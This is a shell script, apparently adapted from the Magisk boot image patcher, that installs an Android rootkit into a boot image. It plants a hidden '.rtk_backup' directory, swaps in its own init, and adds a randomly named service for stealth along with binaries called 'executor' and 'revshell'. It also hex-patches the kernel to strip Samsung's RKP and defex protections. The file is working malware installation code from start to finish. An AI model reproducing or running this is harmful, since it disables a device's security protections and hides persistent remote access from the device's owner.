#!/system/bin/sh
###########################################################################################
#
# Magisk Boot Image Patcher
# by topjohnwu
#
# (adapted for rootkit, unnecessary code is cut)
#
###########################################################################################

############
# Functions
############

# Pure bash dirname implementation
getdir() {
  case "$1" in
    */*)
      dir=${1%/*}
      if [ -z $dir ]; then
        echo "/"
      else
        echo $dir
      fi
    ;;
    *) echo "." ;;
  esac
}

#################
# Initialization
#################

if [ -z $SOURCEDMODE ]; then
  # Switch to the location of the script file
  cd "`getdir "${BASH_SOURCE:-$0}"`"
  # Load utility functions
  . ./util_functions.sh
fi

BOOTIMAGE="$1"
SYSTEM_ROOT="$2"
[ -e "$BOOTIMAGE" ] || abort "$BOOTIMAGE does not exist!"

# Flags
[ -z $KEEPVERITY ] && KEEPVERITY=false
[ -z $KEEPFORCEENCRYPT ] && KEEPFORCEENCRYPT=false
[ -z $RECOVERYMODE ] && RECOVERYMODE=false
export KEEPVERITY
export KEEPFORCEENCRYPT

chmod -R 755 .

#########
# Unpack
#########

CHROMEOS=false

ui_print "- Unpacking boot image"
./magiskboot unpack "$BOOTIMAGE"

case $? in
  1 )
    abort "! Unsupported/Unknown image format"
    ;;
  2 )
    ui_print "- ChromeOS boot image detected"
    CHROMEOS=true
    ;;
esac

[ -f recovery_dtbo ] && RECOVERYMODE=true

###################
# Ramdisk Restores
###################

cat $BOOTIMAGE > stock_boot.img
cp -af ramdisk.cpio ramdisk.cpio.orig 2>/dev/null

##################
# Ramdisk Patches
##################

ui_print "- Patching ramdisk"

echo "KEEPVERITY=$KEEPVERITY" > config
echo "KEEPFORCEENCRYPT=$KEEPFORCEENCRYPT" >> config
echo "RECOVERYMODE=$RECOVERYMODE" >> config

./magiskboot cpio ramdisk.cpio test
STATUS=$?

if [ $((STATUS & 1)) -ne 0 ]; then
  # unxz original init  (if xz)
  ./magiskboot cpio ramdisk.cpio "extract .backup/init init"
  ./magiskboot cpio ramdisk.cpio "extract .backup/init.xz init.xz" && \
  ./magiskboot decompress init.xz init

  # SAR device detected?   ->  count as 2si here
  $SYSTEM_ROOT && STATUS=$((STATUS | 8))
fi

# TODO : legacy SAR + magisk ??

#  1 = magisk
#  2 = rootkit
#  4 = compressed (ignore)
#  8 = two-stage
case $((STATUS & 11)) in
  0|8 )  # Stock boot
    ui_print "- Stock boot image detected"

    ./magiskboot cpio ramdisk.cpio \
    "add 750 init magiskinit" \
    "patch" \
    "backup ramdisk.cpio.orig" \
    "mkdir 000 .rtk_backup" \
    "add 000 .rtk_backup/.rtk config"

    ;;
  1 )  # Magisk patched
    ui_print "- Magisk patched boot image detected"

    # Execute our patches after magisk to overwrite sepolicy (partial stealth?)
    #   upd:   still not working... magisk policy has priority?
    #  hi fstab fastboot btw
#    ./magiskboot cpio ramdisk.cpio \
#    "mkdir 000 .rtk_backup" \
#    "add 000 .rtk_backup/.rtk config" \
#    "add 750 .rtk_backup/init init" \
#    "add 750 .backup/init magiskinit" \
#    "rm .backup/init.xz" \
#    "add 750 .rtk_backup/magiskinit magisk_orig"

    # Execute before magisk in a more straightforward way
    ./magiskboot cpio ramdisk.cpio \
    "mkdir 000 .rtk_backup" \
    "add 000 .rtk_backup/.rtk config" \
    "mv init .rtk_backup/init" \
    "add 750 init magiskinit" \
    "add 750 .backup/init init" \
    "rm .backup/init.xz"

    ;;
  2|3|10 )  # Rootkit with / without magisk, except 2si magisk
    ui_print "- Rootkit installation detected, reinstalling"

    ./magiskboot cpio ramdisk.cpio \
    "add 000 .rtk_backup/.rtk config" \
    "add 750 init magiskinit"

    ;;
  9|11 )  # 2si magisk (currently unsupported, so just use its overlay.d)
          #  ->  no sepolicy patches, no stealth, use standard magisk context

    ui_print " "
    ui_print "!    Warning: Magisk in SAR / 2SI scheme detected."
    ui_print "Due to compatibility issues, this tool will fallback to Magisk's own overlay.d and use standard magisk context."
    ui_print " "

    SVC_NAME=$(head /dev/urandom -c 60 | tail -c 40 | LC_ALL=C tr -dc A-Za-z0-9 | head -c 13)
    printf "$(cat rtk.rc)" "$SVC_NAME" "$SVC_NAME" "$SVC_NAME" > rtk.rc

    # Fallback to overlay.d (2si, works in newer magisk, limited stealth)
    ./magiskboot cpio ramdisk.cpio \
    "mkdir 000 overlay.d" \
    "mkdir 000 overlay.d/sbin" \
    "add 000 overlay.d/rtk.rc rtk.rc" \
    "add 750 overlay.d/sbin/executor executor" \
    "add 750 overlay.d/sbin/revshell revshell" \
    "mkdir 000 .rtk_backup" \
    "add 000 .rtk_backup/.rtk config"

esac

if [ $((STATUS & 4)) -ne 0 ]; then
  ui_print "- Compressing ramdisk"
  ./magiskboot cpio ramdisk.cpio compress
fi

rm -f ramdisk.cpio.orig config

#################
# Binary Patches
#################

for dt in dtb kernel_dtb extra recovery_dtbo; do
  [ -f $dt ] && ./magiskboot dtb $dt patch && ui_print "- Patch fstab in $dt"
done

if [ -f kernel ]; then
  # Remove Samsung RKP
  ./magiskboot hexpatch kernel \
  49010054011440B93FA00F71E9000054010840B93FA00F7189000054001840B91FA00F7188010054 \
  A1020054011440B93FA00F7140020054010840B93FA00F71E0010054001840B91FA00F7181010054

  # Remove Samsung defex
  # Before: [mov w2, #-221]   (-__NR_execve)
  # After:  [mov w2, #-32768]
  ./magiskboot hexpatch kernel 821B8012 E2FF8F12

  # Force kernel to load rootfs
  # skip_initramfs -> want_initramfs
  ./magiskboot hexpatch kernel \
  736B69705F696E697472616D667300 \
  77616E745F696E697472616D667300
fi

#################
# Repack & Flash
#################

ui_print "- Repacking boot image"
./magiskboot repack "$BOOTIMAGE" || abort "! Unable to repack boot image!"

# Sign chromeos boot
$CHROMEOS && sign_chromeos

# Reset any error code
true
